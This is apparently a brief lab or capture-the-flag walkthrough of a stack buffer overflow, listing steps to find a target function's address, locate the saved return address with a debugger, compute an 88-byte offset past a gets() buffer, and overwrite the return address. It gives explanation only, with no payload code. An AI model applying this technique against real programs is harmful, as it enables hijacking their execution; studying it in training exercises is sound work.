0 - Find address of complete_level function -> 0x000000000040061d. Find the address where the return will go back to -> 0x000000000040068d
1 - Used to debug the program and step through the start_level function up to the gets() call. Then the stack setup is done and the final layout of the return address can be determined
2 - Set a breakpoint at start_level, step to the call of gets()
3 - Prints the stack values nicely formated. Find the address of the return address (second value from step 1) -> 0x7fffffffe648
4 - This gets the number of Bytes we have to overflow to stop right in front of the return address: 0x58 = 88
5 - Overflows the stack and places the address of the complete_function in the return address of the start_function
